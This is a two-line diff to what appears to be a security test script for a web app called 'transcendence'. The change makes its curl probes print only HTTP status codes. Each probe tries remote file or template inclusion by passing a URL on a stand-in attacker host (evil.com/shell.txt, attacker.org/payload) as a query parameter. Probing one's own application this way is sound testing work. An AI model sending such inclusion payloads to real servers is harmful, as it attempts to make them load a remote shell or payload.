@@ -1,2 +1,2 @@
-curl -sk "https://transcendence.nip.io:3000/?file=http://evil.com/shell.txt"
-curl -sk "https://transcendence.nip.io:3000/?template=https://attacker.org/payload"
+curl -sk "https://transcendence.nip.io:3000/?file=http://evil.com/shell.txt" -o /dev/null -w "%{http_code}\n"
+curl -sk "https://transcendence.nip.io:3000/?template=https://attacker.org/payload" -o /dev/null -w "%{http_code}\n"
